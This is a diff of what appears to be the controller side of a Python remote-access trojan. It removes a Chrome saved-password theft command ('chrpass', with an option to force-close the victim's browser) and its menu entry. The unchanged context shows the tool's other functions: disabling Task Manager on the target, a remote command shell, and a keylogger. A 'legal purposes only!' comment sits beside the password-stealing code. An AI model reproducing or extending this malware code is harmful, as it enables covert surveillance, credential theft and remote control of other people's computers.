@@ -369,27 +369,6 @@ def disable_taskmgr():
     print(decode_utf8(recv(intBuff)))  # print response
 
 
-def chrpass():  # legal purposes only!
-    send(str.encode("chrpass"))
-    strClientResponse = decode_utf8(recv(intBuff))
-
-    if strClientResponse == "noexist":
-        print("Google Chrome is not installed on target.")
-        return
-
-    if strClientResponse == "error":
-        strClose = input("Browser is currently in use. Would you like to close it? y/n ")
-        if strClose == "y":
-            send(str.encode("close"))
-        else:
-            send(str.encode("stay"))
-        return
-    else:
-        intBuffer = int(strClientResponse)
-
-    print("\n" + decode_utf8(recvall(intBuffer)))  # print results
-
-
 def keylogger(option):
     if option == "start":
         send(str.encode("keystart"))
@@ -497,8 +476,6 @@ def send_commands():
                 command_shell()
             elif strChoice == "--d":
                 disable_taskmgr()
-            elif strChoice == "--g":
-                chrpass()
             elif strChoice == "--k start":
                 keylogger("start")
             elif strChoice == "--k stop":
